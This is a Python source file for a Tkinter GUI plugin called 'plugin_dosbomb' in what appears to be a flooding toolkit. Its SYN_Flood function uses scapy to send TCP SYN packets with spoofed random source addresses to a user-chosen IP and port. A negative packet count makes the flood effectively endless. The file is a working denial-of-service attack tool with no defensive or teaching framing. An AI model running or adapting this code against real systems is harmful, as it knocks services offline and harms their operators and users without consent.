try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk

from tkinter import messagebox 
from tkinter import *

try:
    import ttk
    py3 = False
except ImportError:
    import tkinter.ttk as ttk
    py3 = True

from scapy.all import *
from random import randint
import configparser,string
import multiprocessing


class plugin_dosbomb:
	config = configparser.RawConfigParser()
	config.read('./modules/general/flooders/plugin_flooders/synflooder/synflooder.cnf')

	plugin_data = dict(config.items('plugin'))
	run = False
	run_task = []



	#IP enter gadget
	class iPentry(tk.Widget):
		def __init__(self, master):
			tk.Widget.__init__(self, master, '::ipentry::ipentry')

		def get(self):
			return self.tk.call(self._w, 'get')

		def complete(self):
			return self.tk.call(self._w, 'complete')

	def getIP(self,event):
		myip = self.enterIp.get()
		#print(f"myip is {myip}")

	def suspend(self):
		print("Suspend Synflooder process")
		if len(self.run_task) > 0:
			for x in range(0,len(self.run_task)):
				if self.run_task[x].is_alive():
					self.run_task[x].terminate()

	def start(self):
		print("Start Synflooder")
		ip = self.enterIp.get()
		self.run_task.append(multiprocessing.Process(target=self.SYN_Flood, args=('.'.join(map(str, list(ip))), int(self.Spinbox1.get()), int(self.Spinbox1_1.get()),int(self.Spinbox1_2.get()),)))
		self.run_task[len(self.run_task)-1].start()
		
		

	def gui(self,guihandl):
		guihandl['root'].tk.call('package','require','ipentry')
		self.PNotebook1_t5 = tk.Frame(guihandl['notbkhandl'])
		guihandl['notbkhandl'].add(self.PNotebook1_t5, padding=3)
		guihandl['notbkhandl'].tab(guihandl['notbkhandl'].index("end")-1, text=self.plugin_data['plugin_name'],compound="none",underline="-1",)
		self.PNotebook1_t5.configure(background="#d9d9d9")
		self.PNotebook1_t5.configure(highlightbackground="#d9d9d9")
		self.PNotebook1_t5.configure(highlightcolor="black")
		self.enterIp = self.iPentry(self.PNotebook1_t5)
		self.enterIp.place(relx=0.179, rely=0.044)#, height=26, width=42)#, height=26, width=42)
		
		self.Label6 = tk.Label(self.PNotebook1_t5)
		self.Label6.place(relx=0.518, rely=0.0, height=26, width=109)
		self.Label6.configure(background="#d9d9d9")
		self.Label6.configure(disabledforeground="#a3a3a3")
		self.Label6.configure(foreground="#000000")
		self.Label6.configure(text='''Console Output''')

		self.Text1 = tk.Text(self.PNotebook1_t5)
		self.Text1.place(relx=0.518, rely=0.119, relheight=0.811, relwidth=0.454)

		self.Text1.configure(background="white")
		self.Text1.configure(font="TkTextFont")
		self.Text1.configure(foreground="black")
		self.Text1.configure(highlightbackground="#d9d9d9")
		self.Text1.configure(highlightcolor="black")
		self.Text1.configure(insertbackground="black")
		self.Text1.configure(selectbackground="blue")
		self.Text1.configure(selectforeground="white")
		self.Text1.configure(wrap="word")

		self.Label7 = tk.Label(self.PNotebook1_t5)
		self.Label7.place(relx=0.048, rely=0.031, height=36, width=62)
		self.Label7.configure(background="#d9d9d9")
		self.Label7.configure(disabledforeground="#a3a3a3")
		self.Label7.configure(foreground="#000000")
		self.Label7.configure(text='''Enter IP:''')

		self.Label8 = tk.Label(self.PNotebook1_t5)
		self.Label8.place(relx=0.0, rely=0.22, height=26, width=92)
		self.Label8.configure(background="#d9d9d9")
		self.Label8.configure(disabledforeground="#a3a3a3")
		self.Label8.configure(foreground="#000000")
		self.Label8.configure(text='''Target Port:''')

		self.Label9 = tk.Label(self.PNotebook1_t5)
		self.Label9.place(relx=0.0, rely=0.396, height=26, width=95)
		self.Label9.configure(background="#d9d9d9")
		self.Label9.configure(disabledforeground="#a3a3a3")
		self.Label9.configure(foreground="#000000")
		self.Label9.configure(text='''Packet Count:''')

		self.Label10 = tk.Label(self.PNotebook1_t5)
		self.Label10.place(relx=0.018, rely=0.573, height=26, width=82)
		self.Label10.configure(background="#d9d9d9")
		self.Label10.configure(disabledforeground="#a3a3a3")
		self.Label10.configure(foreground="#000000")
		self.Label10.configure(text='''Packet Size:''')

		var_dummy1 = StringVar()
		self.Spinbox1 = tk.Spinbox(self.PNotebook1_t5, from_=-1.0, to=66000,textvariable=var_dummy1)
		self.Spinbox1.place(relx=0.196, rely=0.22, relheight=0.106
			, relwidth=0.154)
		self.Spinbox1.configure(activebackground="#f9f9f9")
		self.Spinbox1.configure(background="white")
		self.Spinbox1.configure(buttonbackground="#d9d9d9")
		self.Spinbox1.configure(disabledforeground="#a3a3a3")
		self.Spinbox1.configure(font="TkDefaultFont")
		self.Spinbox1.configure(foreground="black")
		self.Spinbox1.configure(highlightbackground="black")
		self.Spinbox1.configure(highlightcolor="black")
		self.Spinbox1.configure(insertbackground="black")
		self.Spinbox1.configure(selectbackground="blue")
		self.Spinbox1.configure(selectforeground="white")
		var_dummy1.set(80)

		var_dummy2 = StringVar()
		self.Spinbox1_1 = tk.Spinbox(self.PNotebook1_t5, from_=-1.0, to=5000.0,textvariable=var_dummy2)
		self.Spinbox1_1.place(relx=0.196, rely=0.396, relheight=0.106
			, relwidth=0.154)
		self.Spinbox1_1.configure(activebackground="#f9f9f9")
		self.Spinbox1_1.configure(background="white")
		self.Spinbox1_1.configure(buttonbackground="#d9d9d9")
		self.Spinbox1_1.configure(disabledforeground="#a3a3a3")
		self.Spinbox1_1.configure(font="TkDefaultFont")
		self.Spinbox1_1.configure(foreground="black")
		self.Spinbox1_1.configure(highlightbackground="black")
		self.Spinbox1_1.configure(highlightcolor="black")
		self.Spinbox1_1.configure(insertbackground="black")
		self.Spinbox1_1.configure(selectbackground="blue")
		self.Spinbox1_1.configure(selectforeground="white")
		self.Spinbox1_1.configure(text=20)
		var_dummy2.set(-1)

		var_dummy3 = StringVar()
		self.Spinbox1_2 = tk.Spinbox(self.PNotebook1_t5, from_=-1.0, to=10000.0,textvariable=var_dummy3)
		self.Spinbox1_2.place(relx=0.196, rely=0.573, relheight=0.106
			, relwidth=0.154)
		self.Spinbox1_2.configure(activebackground="#f9f9f9")
		self.Spinbox1_2.configure(background="white")
		self.Spinbox1_2.configure(buttonbackground="#d9d9d9")
		self.Spinbox1_2.configure(disabledforeground="#a3a3a3")
		self.Spinbox1_2.configure(font="TkDefaultFont")
		self.Spinbox1_2.configure(foreground="black")
		self.Spinbox1_2.configure(highlightbackground="black")
		self.Spinbox1_2.configure(highlightcolor="black")
		self.Spinbox1_2.configure(insertbackground="black")
		self.Spinbox1_2.configure(selectbackground="blue")
		self.Spinbox1_2.configure(selectforeground="white")
		var_dummy3.set(0)

		self.Button1 = tk.Button(self.PNotebook1_t5,command=self.start_proc)
		self.Button1.place(relx=0.054, rely=0.793, height=33, width=96)
		self.Button1.configure(activebackground="#ececec")
		self.Button1.configure(activeforeground="#000000")
		self.Button1.configure(background="#d9d9d9")
		self.Button1.configure(disabledforeground="#a3a3a3")
		self.Button1.configure(foreground="#000000")
		self.Button1.configure(highlightbackground="#d9d9d9")
		self.Button1.configure(highlightcolor="black")
		self.Button1.configure(pady="0")
		self.Button1.configure(text='''Launch''',state="normal")

		self.Button1_3 = tk.Button(self.PNotebook1_t5,command=self.stop_proc)
		self.Button1_3.place(relx=0.268, rely=0.789, height=33, width=96)
		self.Button1_3.configure(activebackground="#ececec")
		self.Button1_3.configure(activeforeground="#000000")
		self.Button1_3.configure(background="#d9d9d9")
		self.Button1_3.configure(disabledforeground="#a3a3a3")
		self.Button1_3.configure(foreground="#000000")
		self.Button1_3.configure(highlightbackground="#d9d9d9")
		self.Button1_3.configure(highlightcolor="black")
		self.Button1_3.configure(pady="0")
		self.Button1_3.configure(text='''Stop''',state="disabled")

		#guihandl['root'].bind('<Return>', self.getIP)

		#print("Synflooder gui shown")
	def start_proc(self):
		self.Button1_3.configure(state="normal")
		self.Button1.configure(state="disabled")
		self.run = True

	def stop_proc(self):
		self.Button1_3.configure(state="disabled")
		self.Button1.configure(state="normal")
		self.run = False

	def randomIP(self):
		ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
		return ip


	def randInt(self):
		x = randint(1000, 9000)
		return x


	def SYN_Flood(self,dstIP, dstPort, counter,bysiz = 0):
		total = 0
		if counter < 0 :
			counter = 10**10
		print ("Packets are sending ...")

		for x in range (0, counter):
			s_port = self.randInt()
			s_eq = self.randInt()
			w_indow = self.randInt()

			IP_Packet = IP ()
			IP_Packet.src = self.randomIP()
			IP_Packet.dst = dstIP

			TCP_Packet = TCP ()
			TCP_Packet.sport = s_port
			TCP_Packet.dport = int(dstPort)
			TCP_Packet.flags = "S"
			TCP_Packet.seq = s_eq
			TCP_Packet.window = w_indow

			if not bysiz == 0 :
				send(IP_Packet/TCP_Packet/Raw(self.Fillbytes(bysiz)), verbose=0)
			else :
				send(IP_Packet/TCP_Packet,verbose=0)

			total+=1

		

	def Fillbytes(self,size):
		res = ''.join(random.choices(string.ascii_uppercase +string.digits, k = size))
		return res

